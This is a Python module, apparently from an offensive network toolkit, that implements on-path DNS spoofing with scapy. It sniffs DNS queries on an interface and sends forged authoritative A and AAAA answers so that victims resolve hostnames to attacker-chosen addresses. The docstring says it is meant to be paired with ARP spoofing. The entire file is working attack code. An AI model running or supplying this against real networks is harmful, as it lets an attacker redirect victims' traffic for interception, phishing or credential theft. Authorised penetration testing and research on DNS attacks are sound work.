"""DNS spoofing — forge answers for DNS queries we can see (on-path).

Given a hostname→IP map (with `*` wildcard support), builds a forged DNS
response for a captured query so the victim resolves the attacker-chosen IP.
Typically paired with ARP spoofing (so queries flow through us) or the inline
bridge.

Response crafting is pure/testable; the sniff+respond loop is integration.
"""

from __future__ import annotations

import fnmatch
import logging

log = logging.getLogger("reforge.dns")


_A = 1
_AAAA = 28


def _match(qname: str, hostmap: dict[str, str]) -> str | None:
    qname = qname.rstrip(".").lower()
    # lowercase keys so a mixed-case map entry still matches the exact lookup
    # (not only via the wildcard branch)
    lowered = {k.rstrip(".").lower(): v for k, v in hostmap.items()}
    if qname in lowered:
        return lowered[qname]
    for pattern, ip in lowered.items():
        if "*" in pattern and fnmatch.fnmatch(qname, pattern):
            return ip
    return lowered.get("*")


def _record_type(qtype: int, ip: str) -> str | None:
    """The DNSRR type to answer with, or None if the query type can't be
    satisfied by the mapped address (a type mismatch is discarded by the
    resolver, so don't waste a forged packet on it)."""
    is_v6 = ":" in ip
    if qtype == _AAAA:
        return "AAAA" if is_v6 else None
    if qtype == _A:
        return "A" if not is_v6 else None
    return None


def spoof_response(query_pkt, hostmap: dict[str, str], ttl: int = 300):
    """Build a forged DNS answer for `query_pkt`, or None if no mapping applies.

    Works on an IP/UDP/DNS query (link='ip') or Ether/IP/UDP/DNS.
    """
    from scapy.layers.dns import DNS, DNSRR
    from scapy.layers.inet import IP, UDP

    if not query_pkt.haslayer(DNS) or query_pkt[DNS].qr != 0:
        return None
    dns = query_pkt[DNS]
    qd0 = _first(dns.qd)
    qname_raw = getattr(qd0, "qname", None)          # malformed question -> Raw, no qname
    if qd0 is None or not qname_raw:
        return None
    qname = qname_raw.decode("latin-1") if isinstance(qname_raw, bytes) else str(qname_raw)
    ip = _match(qname, hostmap)
    if not ip:
        return None

    # answer the type the victim actually asked for (A vs AAAA); skip mismatches
    rr_type = _record_type(int(getattr(qd0, "qtype", _A)), ip)
    if rr_type is None:
        return None

    ipl = query_pkt[IP]
    udpl = query_pkt[UDP]
    return (IP(src=ipl.dst, dst=ipl.src)
            / UDP(sport=udpl.dport, dport=udpl.sport)
            / DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                  an=DNSRR(rrname=qd0.qname, type=rr_type, ttl=ttl, rdata=ip)))


def _first(field):
    """DNS qd/an are PacketListField (scapy 2.7) or single packets (older)."""
    if field is None:
        return None
    try:
        return field[0] if len(field) else None
    except TypeError:
        return field


class DnsSpoofer:  # pragma: no cover (needs root + live traffic)
    """Sniff DNS queries on `iface` and answer matching ones with forged IPs."""

    def __init__(self, iface: str, hostmap: dict[str, str]):
        self.iface = iface
        self.hostmap = hostmap
        self._sniffer = None
        self.seen = 0        # DNS queries observed (are we even on-path?)
        self.answered = 0    # queries we forged a reply for (did our map match?)

    def _on(self, pkt):
        from scapy.layers.dns import DNS
        from scapy.sendrecv import send

        try:
            if pkt.haslayer(DNS) and int(pkt[DNS].qr) == 0:
                self.seen += 1
            resp = spoof_response(pkt, self.hostmap)
        except Exception:            # a hostile query must never kill the loop
            return
        if resp is not None:
            send(resp, iface=self.iface, verbose=False)
            self.answered += 1

    def status(self) -> dict:
        return {"running": self._sniffer is not None, "seen": self.seen,
                "answered": self.answered, "mappings": len(self.hostmap)}

    def start(self) -> None:
        from scapy.sendrecv import AsyncSniffer

        self._sniffer = AsyncSniffer(iface=self.iface, filter="udp port 53",
                                     prn=self._on, store=False)
        self._sniffer.start()
        log.info("DNS spoofer running on %s (%d mappings)", self.iface, len(self.hostmap))

    def stop(self) -> None:
        if self._sniffer:
            self._sniffer.stop()
            self._sniffer = None
